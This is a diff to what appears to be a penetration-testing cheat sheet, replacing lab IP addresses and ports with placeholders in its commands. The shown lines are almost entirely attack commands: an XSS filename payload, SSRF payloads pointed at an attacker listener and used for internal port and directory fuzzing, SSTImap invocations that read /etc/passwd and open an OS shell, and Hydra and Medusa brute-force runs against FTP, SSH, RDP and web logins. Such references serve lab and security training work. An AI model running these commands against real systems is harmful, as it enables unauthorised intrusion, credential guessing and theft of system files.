@@ -903,8 +903,8 @@ file<script>alert(window.origin);</script>.jpg
 - External Access
 
 ```
-$ nc -nlvp 8000
-dateserver=http://<Attacker IP address>:8000&date=2024-01-01
+$ nc -nlvp <port>
+dateserver=http://<Attacker IP address>:<port>&date=2024-01-01
 ```
 
 - Internal Access
@@ -919,13 +919,13 @@ dateserver=http://127.0.0.1/index.php&date=2024-01-01
 dateserver=http://127.0.0.1:81&date=2024-01-01
 dateserver=http://127.0.0.1:82&date=2024-01-01
 $ seq 1 10000 > ports.txt
-$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+$ ffuf -w ./ports.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
 ```
 
 - Internal Directory Brute-Force
 
 ```
-$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
+$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
 
 - Local File Inclusion (LFI)
@@ -986,10 +986,10 @@ ${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if 
 https://github.com/epinna/tplmap
 https://github.com/vladko312/SSTImap
 $ python3 sstimap.py
-$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
-$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
-$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
-$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
+$ python3 sstimap.py -u http://<IP address>/index.php?name=test
+$ python3 sstimap.py -u http://<IP address>/index.php?name=test -D '/etc/passwd' './passwd'
+$ python3 sstimap.py -u http://<IP address>/index.php?name=test -S id
+$ python3 sstimap.py -u http://<IP address>/index.php?name=test --os-shell
 ```
 
 #15. - Server-Side Includes (SSI) Injection
@@ -1057,26 +1057,26 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 - Hydra
 
 ```
-$ hydra -l admin -P <password_file> ftp://192.168.1.100
-$ hydra -l root -P <password_file> ssh://192.168.1.100
-$ hydra -l admin -P <password_file> 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
-$ hydra -l admin -P <password_file> 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
+$ hydra -l admin -P <password_file> ftp://<IP address>
+$ hydra -l root -P <password_file> ssh://<IP address>
+$ hydra -l admin -P <password_file> <IP address> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
+$ hydra -l admin -P <password_file> <IP address> http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
 ```
 
 - Medusa
 
 ```
-$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
-$ medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
-$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
-$ medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET
-$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
+$ medusa -h <IP address> -u admin -P passwords.txt -M ssh
+$ medusa -h <IP address> -U users.txt -P passwords.txt -M ftp -t 5
+$ medusa -h <IP address> -u admin -P passwords.txt -M rdp
+$ medusa -h <Domain Name> -U users.txt -P passwords.txt -M http -m GET
+$ medusa -h <IP address> -u admin -P passwords.txt -M ssh -f
 ```
 
 - Username Anarchy
 
 ```
-$ username-anarchy Jane Smith
+$ username-anarchy John Milks
 $ username-anarchy -i names.txt
 $ username-anarchy -a --country us
 $ username-anarchy -l
@@ -1099,7 +1099,7 @@ $ cupp -l
 - Username Enumeration
 
 ```
-$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
+$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
 ```
 
 #19. - Sensitive Data Exposure
